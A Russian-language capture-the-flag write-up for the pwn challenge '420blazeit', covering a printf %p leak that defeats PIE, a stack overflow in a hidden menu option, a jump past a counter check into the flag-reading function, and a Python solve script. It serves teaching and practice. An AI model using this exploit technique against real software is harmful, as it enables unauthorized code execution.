# 420blazeit — writeup

**Категория:** pwn / binary exploitation
**Флаг:** `cruXipher{mIg_n0_$C0p3_G3t_rek7_m8}`
**TL;DR:** утечка адреса через забытый `printf("%p")` → обход PIE, затем переполнение стека в скрытом пункте меню `420` → `ret2win` в функцию, которая печатает `flag.txt` (с обходом гейта по счётчику прыжком в середину функции).

---

## 1. Разведка

```
$ file chall
chall: ELF 64-bit LSB pie executable, x86-64, dynamically linked,
       interpreter /lib64/ld-linux-x86-64.so.2, stripped
```

Защиты:

| Защита        | Статус            | Следствие                                   |
|---------------|-------------------|---------------------------------------------|
| PIE           | ✅ включён         | нужен лик адреса, чтобы знать базу           |
| Full RELRO    | ✅ (`BIND_NOW`)    | GOT не перезаписать                          |
| Stack canary  | ❌ **отсутствует** | сохранённый RIP переписывается напрямую      |
| NX            | ✅                 | шеллкод на стеке не исполнить → нужен ret2win |

Бинарь stripped, поэтому все функции разбирались по адресам из `objdump -d -M intel`.

Тематика — мемы MLG. Главное меню:

```
1) dorito 2) doge 3) weed 4) noscope 5) quit
```

Пункты 1/3/4 просто инкрементят счётчики-«очки». Интересны `2) doge` и
**скрытый пункт `420`**, которого в меню нет.

### Карта функций

| Адрес    | Роль                                                              |
|----------|-------------------------------------------------------------------|
| `0x164b` | `main`: `setvbuf`, инкремент глобала `[0x4058]`, цикл меню         |
| `0x12a9` | диспетчер меню: `scanf("%d")` + `switch`                          |
| `0x1387` | `doge` — содержит лик-примитив                                     |
| `0x158c` | **win**: `fopen("flag.txt")` → `fgets` → `fputs(stdout)`           |
| `0x1567` | печатает `QUICKSCOPE???????` если `[0x4058] > 1`                   |

## 2. Уязвимость №1 — утечка адреса (обход PIE)

Функция `doge` (`0x1387`) по ветке «убить доге» вызывает:

```c
// псевдокод по дизассемблеру
if (global_4010 == 1) {              // в .data лежит 1 -> проходит с первого раза
    puts("doge love u");
    puts("do u love doge?\nyes or no");
    scanf("%3s", a);
    if (strcmp(a, "yes") != 0) {
        puts("kil doge?");
        scanf("%3s", b);
        if (strcmp(b, "yes") == 0) {
            printf("AAAAAAAAAAAAA%p\n", &doge);   // <-- ЛИК адреса кода
            puts("u kil doge :(");
            global_4010 = 0;
        }
    }
}
```

Формат-строка содержит `%p`, но каноничный аргумент под него не выставлен —
`printf` печатает то, что лежит в регистре-аргументе, а именно адрес самой
функции `doge`.

**Путь к лику:** `2` → `no` → `yes`.

```
AAAAAAAAAAAAA0x55e51e8bc387
```

Поскольку `doge` находится по смещению `0x1387` от базы образа:

```
PIE_base = leak - 0x1387
```

Значение всегда оканчивается на `000` (выровнено по странице) — хорошая проверка
корректности лика. Глобал `[0x4010]` инициализирован единицей в `.data`, поэтому
лик срабатывает с первого захода в `doge`.

## 3. Уязвимость №2 — переполнение стека (скрытый пункт `420`)

В диспетчере меню, помимо 1–5, есть необъявленная ветка на значение
`0x1a4` = **420**:

```c
if (choice == 420) {
    printf("enter ur mlg gamertag: ");
    read(0, buf, 0x80);          // buf = [rbp-0x20] -> 32 байта, читаем 128
}
```

Читается **0x80 = 128 байт** в буфер размером **0x20 = 32 байта**. Канарейки нет,
значит сохранённый RIP переписывается напрямую.

Раскладка стека функции-диспетчера:

```
[rbp-0x20] ───────────── buf (32 байта)
[rbp]      ───────────── saved rbp (8 байт)
[rbp+0x08] ───────────── saved RIP   <-- цель
```

**Смещение до RIP = 0x20 + 8 = 40 байт.**

## 4. Win-функция и её гейт

По адресу `0x158c` лежит ровно то, что нужно:

```c
void win() {                      // 0x158c
    if (global_4058 > 1) {        // 0x1598: cmp [0x4058],1 ; jle fail
        FILE *f = fopen("flag.txt", "r");   // 0x15a7
        if (!f) { puts("flag missing..."); exit(1); }
        fgets(buf, 0x64, f);      // buf = [rbp-0x70]
        fputs(buf, stdout);
        fclose(f);
        exit(0);
    }
    printf("no mlg quickscope yet bruh...");
    raise(SIGSEGV);
}
```

Проблема: функция закрыта проверкой `[0x4058] > 1`, а `main` поднимает этот
счётчик лишь до **1**. Штатного пути сделать его `> 1` нет.

### Обход гейта: прыжок в середину функции

Вместо входа в `0x158c` прыгаем сразу на **`0x15a7`** — это первая инструкция
**после** `cmp/jle`. Проверка счётчика просто не выполняется.

Есть нюанс: прыгая на `0x15a7`, мы пропускаем и пролог
(`push rbp; mov rbp,rsp; sub rsp,0x70`). Функция адресует свои локалки через
`rbp` (`[rbp-0x8]` под `FILE*`, `[rbp-0x70]` под буфер). После `leave` в
функции-диспетчере `rbp` примет значение, которое мы сами положили в слот
«saved rbp». Поэтому туда кладём **валидный записываемый адрес** — страницу
данных `base + 0x4100` (RW-сегмент `.data`/`.bss`), чтобы `[rbp-0x8]` и
`[rbp-0x70]` указывали в отображённую память.

Выравнивание стека под `movaps` в libc при таком прыжке оказалось корректным —
дополнительный `ret`-гаджет не понадобился (проверено эмпирически, `exit=0`).

## 5. Сборка эксплойта

Пейлоад одного выстрела по пункту `420`:

```
┌──────────────┬──────────────────────┬────────────────────┐
│  32 × 'B'    │ saved rbp = base+0x4100 │ RIP = base+0x15a7 │
└──────────────┴──────────────────────┴────────────────────┘
     padding        валидный RW-адрес      обход гейта + fopen
```

Полная цепочка:

1. `2` → `no` → `yes`  → лик `&doge` → вычисляем `PIE_base`.
2. `420` → ждём приглашение `enter ur mlg gamertag:` (процесс встал на `read`).
3. Шлём `b"B"*40 + p64(base+0x15a7)` (где байты 32–39 = `base+0x4100`).
4. Функция открывает `flag.txt`, печатает его в stdout и делает `exit(0)`.

> Важный момент по вводу: пункт `420` использует сырой `read()`, а меню —
> `scanf("%d")` поверх stdio-буфера. Поэтому `420\n` и сам пейлоад нужно слать
> **раздельно**, дождавшись приглашения `gamertag:` — иначе stdio «съест»
> пейлоад в свой буфер и сырой `read()` его не увидит.

## 6. Эксплойт (без pwntools)

```python
#!/usr/bin/env python3
import struct, re, sys, time, select, socket, subprocess
p64 = lambda x: struct.pack("<Q", x)

DOGE_OFF = 0x1387   # leak - this = PIE base
WIN_OFF  = 0x15a7   # fopen("flag.txt")..., мимо проверки счётчика
RBP_OFF  = 0x4100   # любой адрес в RW-странице данных
PAD      = 32       # buffer at rbp-0x20

# ... класс Tube (local/remote) опущен для краткости ...

def pwn(t):
    t.until("otion:"); t.drain(0.3)
    # --- лик PIE ---
    t.send(b"2\n");   t.until("yes or no")
    t.send(b"no\n");  t.until("kil doge?")
    t.send(b"yes\n")
    blob = t.until("otion:")
    base = int(re.search(rb"0x[0-9a-fA-F]{6,}", blob).group(), 16) - DOGE_OFF
    print("[+] PIE base =", hex(base))
    t.drain(0.3)
    # --- переполнение -> win ---
    t.send(b"420\n"); t.until("gamertag:")
    t.send(b"B"*PAD + p64(base+RBP_OFF) + p64(base+WIN_OFF))
    out = t.drain(2.0)
    print(re.search(rb"[A-Za-z0-9_]*\{[^}]*\}", out).group().decode())
```

Запуск:

```bash
python3 solve.py HOST PORT    # по сети
python3 solve.py ./chall      # локально (нужен свой flag.txt)
```

Стабильность: 3/3 запуска со свежим ASLR — лик всегда выровнен по странице,
смещения фиксированы относительно базы.

## 8. Выводы / чему учит задача

- **PIE без лика бесполезен:** один забытый `printf("%p")` сдаёт всю базу образа.
- **Отсутствие канарейки** превращает переполнение буфера в прямую перезапись RIP.
- **Прыжок в середину функции** — удобный способ обойти проверку-гейт: не обязательно
  входить с начала, достаточно попасть за условие. Главное — не забыть про `rbp`,
  если пропускаешь пролог.
- **Смешение `scanf`/`read`** на одном дескрипторе — источник коварных багов ввода;
  для эксплойта это значит слать данные порциями по приглашениям.
